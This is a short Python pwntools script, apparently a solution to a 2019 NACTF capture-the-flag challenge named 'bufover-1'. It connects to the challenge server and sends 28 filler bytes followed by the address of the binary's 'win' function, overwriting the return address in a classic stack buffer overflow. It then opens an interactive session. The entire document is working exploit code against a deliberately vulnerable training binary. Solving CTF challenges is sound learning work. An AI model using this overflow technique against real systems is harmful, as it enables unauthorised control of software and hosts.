#!/usr/bin/env python

from pwn import *
e = ELF('./bufover-1')
win = e.symbols['win']
p = remote('shell.2019.nactf.com', 31462)
p.recv()
payload = "A"*28
payload+= p32(win)
p.sendline(payload)
p.interactive()